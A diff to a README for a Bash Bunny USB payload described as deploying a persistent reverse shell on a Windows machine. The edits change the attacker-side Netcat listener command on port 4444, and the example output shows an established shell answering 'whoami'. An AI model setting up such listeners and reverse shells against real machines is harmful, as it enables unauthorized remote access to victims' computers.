@@ -49,7 +49,7 @@ This **Bash Bunny payload** deploys a **persistent reverse shell** on a Windows 
 ### **🔹 Listener (Attacker Machine)**
 1. Start a Netcat listener on your machine:
    ```bash
-   nc -lvnp 4444
+   nc -lv 4444
    ```
    - Replace `4444` with your desired port.
 
@@ -96,7 +96,7 @@ This **Bash Bunny payload** deploys a **persistent reverse shell** on a Windows 
 ---
 
 ## Example Output  
-On the listener machine (`nc -lvnp 4444`):  
+On the listener machine (`nc -lv 4444`):  
 ```
 Reverse shell connection established.
 whoami
